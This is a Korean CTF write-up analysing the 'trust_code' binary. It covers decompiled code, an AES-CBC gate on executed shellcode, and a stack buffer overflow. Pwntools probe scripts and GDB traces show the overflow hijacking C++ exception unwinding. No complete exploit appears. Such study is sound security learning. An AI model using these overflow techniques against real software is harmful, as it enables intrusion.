<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec trust_code</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/line22/trust_code/trust_code&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>바이너리를 실행하면 iv와 code를 입력받으며, 아무 문자열이나 입력했더니 에러 메시지를 출력하고 종료합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./trust_code</span><br><span class="line">iv&gt; aaaa</span><br><span class="line">code&gt; aaaa</span><br><span class="line"></span><br><span class="line">= Executed =</span><br><span class="line"></span><br><span class="line">Sorry for the inconvenience, there was a problem while decrypting code.</span><br></pre></td></tr></table></figure>
<p><code>main</code> 함수의 디컴파일 결과를 보면 다음과 같이 단순합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  launch();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>그런데 디스어셈블 결과를 보면 <code>__cxa_begin_catch</code> , <code>__cxa_end_catch</code> 함수를 호출하는 부분이 있습니다. 이는 예외 처리에서 사용되는 랜딩 패드 중 catch 블록을 나타냅니다. 내부에서는 <code>puts</code> 함수로 앞서 보았던 에러 메시지를 출력하고 있습니다.</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001860</span> <span class="comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001860</span> <span class="comment">; __unwind &#123; // __gxx_personality_v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001860</span>                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001864</span>                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">fs</span>:<span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000186D</span>                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_8], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001872</span>                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_C], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000187A <span class="comment">;   try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000187A                 <span class="keyword">call</span>    _Z6launchv      <span class="comment">; launch(void)</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000187A <span class="comment">;   &#125; // starts at 187A</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000187F                 <span class="keyword">jmp</span>     $+<span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001884</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001884</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001884</span> loc_1884:                               <span class="comment">; CODE XREF: main+1F↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001884</span>                 <span class="keyword">jmp</span>     loc_18E0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001889</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001889</span> <span class="comment">;   catch(...) // owned by 187A</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001889</span>                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000188C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000188E                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_18], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001893</span>                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001897</span>                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_18] <span class="comment">; void *</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000189C                 <span class="keyword">call</span>    ___cxa_begin_catch</span><br><span class="line"><span class="symbol">.text:</span>00000000000018A1                 <span class="keyword">mov</span>     <span class="built_in">cs</span>:loop_cont, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018AB <span class="comment">;   try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018AB                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, s          <span class="comment">; &quot;\nSorry for the inconvenience, there wa&quot;...</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018B2                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span>00000000000018B2 <span class="comment">;   &#125; // starts at 18AB</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018B7                 <span class="keyword">jmp</span>     $+<span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018BC <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018BC</span><br><span class="line"><span class="symbol">.text:</span>00000000000018BC loc_18BC:                               <span class="comment">; CODE XREF: main+57↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018BC                 <span class="keyword">xor</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span>        <span class="comment">; status</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018BE                 <span class="keyword">call</span>    _exit</span><br><span class="line"><span class="symbol">.text:</span>00000000000018C3 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018C3 <span class="comment">;   cleanup() // owned by 18AB</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018C3                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018C6                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018C8                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_18], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018CD                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018D1 <span class="comment">;   try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018D1                 <span class="keyword">call</span>    ___cxa_end_catch</span><br><span class="line"><span class="symbol">.text:</span>00000000000018D1 <span class="comment">;   &#125; // starts at 18D1</span></span><br></pre></td></tr></table></figure>
<p>따라서 <code>main</code> 함수의 소스 코드는 사실 다음과 같아야 합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        launch();</span><br><span class="line">    &#125; catch (<span class="type">const</span> <span class="built_in">std</span>::exception&amp; e) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Sorry for the inconvenience, there was a problem while decrypting&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>launch</code> 함수는 <code>secret_key.txt</code> 파일의 내용을 읽어 배열 <code>buf</code> 에 저장합니다. 이후 <code>buf</code> 의 내용을 전역 배열 <code>secret_key</code> 에 대입한 후 <code>service</code> 함수를 호출합니다. <code>buf</code> 배열의 크기에서 <code>secret_key</code> 의 길이는 16바이트임을 알 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">launch</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_OWORD *)buf = <span class="number">0LL</span>;</span><br><span class="line">  alarm(<span class="number">30u</span>);</span><br><span class="line">  signal(<span class="number">14</span>, alarm_handler);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;secret_key.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">16uLL</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  *(_OWORD *)secret_key = *(_OWORD *)buf;</span><br><span class="line">  service();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>service</code> 함수는 배열 <code>buf</code> 에 iv를 입력받고, 동일하게 <code>buf</code> 의 내용을 전역 배열 <code>iv</code> 에 대입한 후 <code>loop</code> 함수를 호출합니다. 그런데 입력받는 길이가 배열의 크기보다 큰 32바이트로 스택 버퍼 오버플로우가 발생합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">service</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+20h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;iv&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">32uLL</span>);                          <span class="comment">// buffer overflow!</span></span><br><span class="line">  *(_OWORD *)iv = *(_OWORD *)buf;</span><br><span class="line">  loop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>loop</code> 함수는 <code>loop_cont</code> 값이 참이면 <code>run</code> 함수를 반복하여 호출합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( loop_cont )</span><br><span class="line">    run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>run</code> 함수는 <code>read_code</code> 함수를 호출하여 <code>code</code> 포인터를 반환받습니다. 이후 <code>&amp;code[16]</code> 부터 32바이트를 <code>sc.code</code> 로 복사하고 <code>execute</code> 함수를 호출합니다. <code>sc</code> 는 <code>Shellcode</code> 타입의 객체로, 32바이트 크기의 배열인 <code>code</code> 를 유일한 필드로 가지고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">run</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int128 v0; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="type">char</span> *code; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line">  Shellcode sc; <span class="comment">// [rsp+20h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+40h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  code = read_code();</span><br><span class="line">  v0 = *((_OWORD *)code + <span class="number">1</span>);</span><br><span class="line">  *(_OWORD *)&amp;sc.code[<span class="number">16</span>] = *((_OWORD *)code + <span class="number">2</span>);</span><br><span class="line">  *(_OWORD *)sc.code = v0;</span><br><span class="line">  execute((<span class="type">unsigned</span> __int8 *)&amp;sc);</span><br><span class="line">  Shellcode::~Shellcode(&amp;sc);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>read_code</code> 함수는 48바이트의 code를 배열 <code>buf</code> 에 입력받습니다. 이후 <code>buf</code> 를 인자로 하여 <code>decrypt</code> 함수를 호출하고 포인터를 반환받아 반환합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">read_code</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+50h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;code&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">48uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> decrypt((<span class="type">unsigned</span> __int8 *)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>decrypt</code> 함수는 인자로 주어진 문자열을 <code>key</code> 와 <code>iv</code> 를 이용해 AES-CBC로 복호화합니다. 인자는 <code>read_code</code> 에서 입력받는 code이므로, 애초에 code는 암호문임을 알 수 있습니다. 복호화된 평문은 <code>out</code> 에 저장되는데, <code>out</code> 의 상위 16바이트가 <code>&quot;TRUST_CODE_ONLY!&quot;</code> 가 아니면 예외를 발생시키고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">decrypt</span><span class="params">(<span class="type">char</span> *in)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::exception *exception; <span class="comment">// [rsp+8h] [rbp-120h]</span></span><br><span class="line">  <span class="type">char</span> *out; <span class="comment">// [rsp+18h] [rbp-110h]</span></span><br><span class="line">  <span class="type">char</span> key[<span class="number">248</span>]; <span class="comment">// [rsp+28h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+120h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  out = (<span class="type">char</span> *)operator new[](<span class="number">48uLL</span>);</span><br><span class="line">  AES_set_decrypt_key((__int64)&amp;secret_key, <span class="number">128LL</span>, (<span class="type">int</span> *)key);</span><br><span class="line">  AES_cbc_encrypt((__int64)in, (__int64)out, <span class="number">48LL</span>, (__int64)key, (__int64)iv, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(out, <span class="string">&quot;TRUST_CODE_ONLY!&quot;</span>, <span class="number">16uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = (<span class="built_in">std</span>::exception *)__cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">std</span>::exception::exception(exception);</span><br><span class="line">    __cxa_throw(</span><br><span class="line">      exception,</span><br><span class="line">      (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="built_in">std</span>::exception,</span><br><span class="line">      (<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::exception::~exception);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>decrypt</code> 가 반환하는 <code>out</code> 은 그대로 <code>read_code</code> 의 반환값이 되어, <code>run</code> 함수에서 상위 16바이트를 제외한 나머지가 <code>sc.code</code> 로 복사됩니다. 이후 호출되는 <code>execute</code> 함수는 rwx 권한의 페이지를 할당하여 <code>sc.code</code> 의 내용을 복사하고 실행합니다. 이 때 <code>invalid_check</code> 함수에서 <code>sc.code</code> 를 필터링하는데, <code>\x0f</code> 또는 <code>\x05</code> 가 존재하지 않을 때만 실행을 허용합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">execute</span><span class="params">(<span class="type">unsigned</span> __int8 *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (*addr)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+20h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)invalid_check(a1) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    addr = (<span class="type">void</span> (*)(<span class="type">void</span>))create_rwx(a1);</span><br><span class="line">    addr();</span><br><span class="line">    munmap(addr, <span class="number">0x1000</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;done?&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span> || buf[<span class="number">0</span>] == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    loop_cont = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이상의 내용을 정리하면 프로그램은 다음과 같이 동작합니다.</p>
<ol>
<li><code>iv</code> 와 AES-CBC로 암호화된 code를 입력받아 평문으로 복호화합니다.</li>
<li>평문의 상위 16바이트가 <code>&quot;TRUST_CODE_ONLY!&quot;</code> 가 아닌 경우 예외를 발생시킵니다.</li>
<li>평문에 <code>\x0f</code> 또는 <code>\x05</code> 가 존재하지 않은 경우에만 rwx 페이지로 복사하여 실행합니다.</li>
</ol>
<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
<p>셸을 획득하기 위해서는 상위 16바이트를 <code>&quot;TRUST_CODE_ONLY!&quot;</code>, 나머지를 셸코드로 채운 문자열을 AES-CBC로 암호화하여 code로 입력해야 합니다. 프로그램에서 복호화 과정에 특별한 취약점이 없고 <code>iv</code> 는 직접 입력할 수 있습니다. 따라서 서버에서 사용하는 <code>key</code> 값을 유출하여 올바른 암호문을 생성해야 합니다.</p>
<p>그런데 프로그램을 테스트하기 위해 <code>iv</code> 에 16개의 a, <code>code</code> 에 48개의 a를 입력하면 다음과 같이 명시적으로 호출하지도 않은 출력 루틴이 동작하는 것을 확인할 수 있습니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./trust_code&quot;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendafter(<span class="string">b&quot;iv&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;code&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./test.py</span><br><span class="line">[+] Starting local process &#x27;./trust_code&#x27;: pid 2560632</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [*] Process &#x27;./trust_code&#x27; stopped with exit code 0 (pid 2560632)</span><br><span class="line"></span><br><span class="line">= Executed =</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">Sorry for the inconvenience, there was a problem while decrypting code.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
<p>출력 루틴의 정체는 <code>run</code> 함수에 존재하는 랜딩 패드입니다. <code>run</code> 함수에서 <code>Shellcode</code> 객체를 선언하는데, 예외가 발생하면 스택 되감기 과정에서 이 객체를 소멸시켜야 하므로 소멸자를 호출하는 랜딩 패드를 먼저 방문하는 것입니다. <code>run</code> 함수의 그래프를 살펴보면 그림에서 색칠한 부분과 같이 다른 루틴과 동떨어진 블록이 하나 있습니다. 이 블록이 바로 랜딩 패드입니다.</p>
<p><img src="/images/line22-trust-code/1.png" alt="1.png"></p>
<p>이번에는 버퍼 오버플로우를 일으키기 위해 code에 16개의 a와 8개의 b, 8개의 c를 입력하였습니다. 실행하면 세그멘테이션 오류가 발생하며 종료하는데, &quot;stack smashing detected&quot;와 같은 오류 메시지가 출력되지 않습니다. 이는 Canary 보호 기법에 의한 것이 아니라 다른 루틴에서 오류가 발생하여 종료하였음을 나타냅니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendafter(<span class="string">b&quot;iv&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">16</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;c&quot;</span> * <span class="number">8</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;code&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./test.py</span><br><span class="line">[+] Starting local process &#x27;./trust_code&#x27;: pid 2562716</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [*] Got EOF while reading in interactive</span><br><span class="line">$</span><br><span class="line">[*] Process &#x27;./trust_code&#x27; stopped with exit code -11 (SIGSEGV) (pid 2562716)</span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>
<p>GDB를 붙여 실행하면 오류가 발생한 원인은 <code>_Unwind_RaiseException</code> 함수에서 호출한 루틴이 주소 <code>0x6363636363636363</code> 에 접근을 시도하였기 때문임을 확인할 수 있습니다. 이 주소는 버퍼 오버플로우를 일으키기 위해 입력한 8개의 c에 해당합니다. 또한 <code>_Unwind_RaiseException</code> 함수를 디스어셈블하면 호출한 루틴은 <code>uw_frame_state_for</code> 내장 함수임을 알 수 있습니다. (자세한 설명은 말머리에서 링크한 글의 ‘동적 분석’ 문단을 참고하기 바랍니다)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007ff413636c50 in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">Python Exception &lt;class &#x27;AttributeError&#x27;&gt;: &#x27;NoneType&#x27; object has no attribute &#x27;startswith&#x27;</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> ► 0x7ff413636c50    cmp    byte ptr [rax], 0x48</span><br><span class="line">   0x7ff413636c53    jne    0x7ff413636bb0                &lt;0x7ff413636bb0&gt;</span><br><span class="line"></span><br><span class="line">   0x7ff413636c59    movabs rdx, 0x50f0000000fc0c7</span><br><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            0x6363636363636363  7161677110969590627</span><br><span class="line">pwndbg&gt; k</span><br><span class="line">#0  0x00007ff413636c50 in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">#1  0x00007ff41363808b in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">#2  0x00007ff41383b69c in __cxa_throw () from /lib/x86_64-linux-gnu/libstdc++.so.6</span><br><span class="line">#3  0x000055ffe2bb5333 in decrypt(unsigned char*) ()</span><br><span class="line">#4  0x000055ffe2bb53d6 in read_code() ()</span><br><span class="line">#5  0x000055ffe2bb5627 in run() ()</span><br><span class="line">#6  0x000055ffe2bb56d0 in loop() ()</span><br><span class="line">#7  0x000055ffe2bb5748 in service() ()</span><br><span class="line">#8  0x6363636363636363 in ?? ()</span><br><span class="line">#9  0x0000000000000000 in ?? ()</span><br><span class="line">pwndbg&gt; disass _Unwind_RaiseException</span><br><span class="line">Dump of assembler code for function _Unwind_RaiseException:</span><br><span class="line">...</span><br><span class="line">   0x00007ff413638080 &lt;+304&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ff413638083 &lt;+307&gt;:   mov    rdi,r12</span><br><span class="line">   0x00007ff413638086 &lt;+310&gt;:   call   0x7ff413636800</span><br><span class="line">   0x00007ff41363808b &lt;+315&gt;:   cmp    eax,0x5</span><br><span class="line">   0x00007ff41363808e &lt;+318&gt;:   je     0x7ff413638103 &lt;_Unwind_RaiseException+435&gt;</span><br></pre></td></tr></table></figure>
<p><code>uw_frame_state_for</code> 내장 함수는 인자로 전달된 <code>context</code> 구조체가 나타내는 프레임의 CIE와 FDE를 찾아 해석하는 함수입니다. 이 함수 내부에서 페이로드로 입력한 주소에 접근하는 것은 버퍼 오버플로우로 인해 먼저 스택이 오염되고, 오염된 내용을 스택 되감기 과정에서 참조하면서 <code>context</code> 구조체가 오염되었기 때문임을 추론할 수 있습니다. 이를 확인하기 위해 <code>uw_frame_state_for</code> 함수를 호출하는 <code>_Unwind_RaiseException+310</code> 주소에 중단점을 설정하고 GDB를 붙여 실행해 보겠습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; set $context=$rdi</span><br><span class="line">pwndbg&gt; continue</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffd76e021f0: 0x00007ffd76e02468      0x00007ffd76e02470</span><br><span class="line">0x7ffd76e02200: 0x0000000000000000      0x00007ffd76e02478</span><br><span class="line">0x7ffd76e02210: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffd76e02220: 0x00007ffd76e024b0      0x0000000000000000</span><br><span class="line">0x7ffd76e02230: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffd76e02240: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffd76e02250: 0x00007ffd76e024b8      0x00007ffd76e024c0</span><br><span class="line">0x7ffd76e02260: 0x00007ffd76e02490      0x00007ffd76e02498</span><br><span class="line">0x7ffd76e02270: 0x00007ffd76e026b8      0x0000000000000000</span><br><span class="line">0x7ffd76e02280: 0x00007ffd76e026c0      0x000055d6cf1f7748</span><br><span class="line">pwndbg&gt; continue</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/20gx $context</span><br><span class="line">0x7fff5b23be70: 0x00007fff5b23c0e8      0x00007fff5b23c0f0</span><br><span class="line">0x7fff5b23be80: 0x0000000000000000      0x00007fff5b23c0f8</span><br><span class="line">0x7fff5b23be90: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fff5b23bea0: 0x00007fff5b23c130      0x0000000000000000</span><br><span class="line">0x7fff5b23beb0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fff5b23bec0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fff5b23bed0: 0x00007fff5b23c138      0x00007fff5b23c140</span><br><span class="line">0x7fff5b23bee0: 0x00007fff5b23c110      0x00007fff5b23c118</span><br><span class="line">0x7fff5b23bef0: 0x00007fff5b23c368      0x0000000000000000</span><br><span class="line">0x7fff5b23bf00: 0x00007fff5b23c370      0x6363636363636363</span><br></pre></td></tr></table></figure>
<p>계속 실행하다 보면 <code>context-&gt;ra</code> 필드의 값이 <code>0x000055d6cf1f7748</code> 에서 <code>0x6363636363636363</code> 으로 바뀌는 것을 확인할 수 있습니다. 전자는 버퍼 오버플로우가 발생하는 <code>service</code> 루틴의 내부이고, 후자는 버퍼 오버플로우로 인해 변조된 리턴 주소입니다.</p>
